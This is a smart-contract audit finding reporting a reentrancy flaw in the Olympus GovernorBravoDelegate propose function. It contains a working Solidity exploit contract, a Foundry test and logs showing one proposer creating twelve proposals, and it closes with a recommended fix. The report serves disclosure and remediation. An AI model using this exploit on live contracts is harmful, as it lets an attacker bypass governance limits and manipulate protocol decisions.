Mysterious Honey Falcon

medium

# Proposer can create high number of proposals through reentrancy

## Summary

The reentrancy through the [`_isHighRiskProposal`](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L611-L670) function of the GovernorBravoDelegate contract allows the creation of a high number of proposals by the same proposer.

## Vulnerability Detail

The [`propose`](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L127-L205) function of `GovernorBravoDelegate` contract [ensures that the proposer can create only one proposal](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L147-L154) that is either pending or active.

```solidity
uint256 latestProposalId = latestProposalIds[msg.sender];
if (latestProposalId != 0) {
    ProposalState proposersLatestProposalState = state(latestProposalId);
    if (proposersLatestProposalState == ProposalState.Active)
         revert GovernorBravo_Proposal_AlreadyActive();
    if (proposersLatestProposalState == ProposalState.Pending)
         revert GovernorBravo_Proposal_AlreadyPending();
}
``` 

Once the proposal is created, the value in the [`latestProposalIds`](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L190) mapping is updated. The issue is that before this update, the [`_isHighRiskProposal`](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L169) function is executed, allowing reentrancy through a call to [`configureDependencies`](https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L655-L656) of the provided target address. This can be exploited by an attacker who creates a proposal that reenters the `propose` function before the `latestProposalIds` mapping is updated, thereby creating additional proposals

The following proof of concept demonstrates the creation of 12 proposals by a single proposer:

`ReentrancyExploit` contract:
```solidity
contract ReentrancyExploit {
    using Address for address;

    GovernorBravoDelegator governorBravoDelegator;
    Kernel kernel;
    
    uint256 depth = 0;

    function attack(GovernorBravoDelegator _governorBravoDelegator, Kernel _kernel) external {
        governorBravoDelegator = _governorBravoDelegator;
        kernel = _kernel;
        
        // Proposal 1
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        string[] memory signatures = new string[](1);
        bytes[] memory calldatas = new bytes[](1);
        string memory description = "Proposal 1";
        
        targets[0] = address(kernel);
        values[0] = 0;
        signatures[0] = "";
        calldatas[0] = abi.encodeWithSelector(
            kernel.executeAction.selector,
            Actions.ActivatePolicy,
            address(this)
        );
    
        bytes memory data = address(governorBravoDelegator).functionCall(
            abi.encodeWithSignature(
                "propose(address[],uint256[],string[],bytes[],string)",
                targets,
                values,
                signatures,
                calldatas,
                description
            )
        );

        uint256 proposalId = abi.decode(data, (uint256));
        console2.log("created proposal", proposalId);
    }

    function configureDependencies() external returns (Keycode[] memory dependencies) {
        console2.log("reentrancy");

        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        string[] memory signatures = new string[](1);
        bytes[] memory calldatas = new bytes[](1);
        string memory description = "Proposal 2";
        
        targets[0] = address(kernel);
        values[0] = 0;
        signatures[0] = "";
        calldatas[0] = "";
        if(depth++ < 10) {
            calldatas[0] = abi.encodeWithSelector(
                kernel.executeAction.selector,
                Actions.ActivatePolicy,
                address(this)
            );
        }

        bytes memory data = address(governorBravoDelegator).functionCall(
            abi.encodeWithSignature(
                "propose(address[],uint256[],string[],bytes[],string)",
                targets,
                values,
                signatures,
                calldatas,
                description
            )
        );
        uint256 proposalId = abi.decode(data, (uint256));
        console2.log("created proposal", proposalId);
    }
}
```

Foundry test case:
```solidity
function testExploit2() public {
    ReentrancyExploit exploit = new ReentrancyExploit();
    
    vm.prank(alice);
    gohm.transfer(address(exploit), 110_000e18);
    gohm.checkpointVotes(address(exploit));

    exploit.attack(governorBravoDelegator, kernel);
}
```

Results:
```shell
[PASS] testExploit2() (gas: 5162466)
Logs:
  reentrancy
  reentrancy
  reentrancy
  reentrancy
  reentrancy
  reentrancy
  reentrancy
  reentrancy
  reentrancy
  reentrancy
  reentrancy
  created proposal 12
  created proposal 11
  created proposal 10
  created proposal 9
  created proposal 8
  created proposal 7
  created proposal 6
  created proposal 5
  created proposal 4
  created proposal 3
  created proposal 2
  created proposal 1

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 18.72ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Impact

As a proposer, the attacker can bypass the limit of one active/pending proposal and create multiple proposals.

## Code Snippet

- https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L655-L656
- https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L190

## Tool used

Manual Review

## Recommendation

It is recommended to follow the checks-effects-interactions pattern and update the `latestProposalIds` mapping before executing the `_isHighRiskProposal` function.
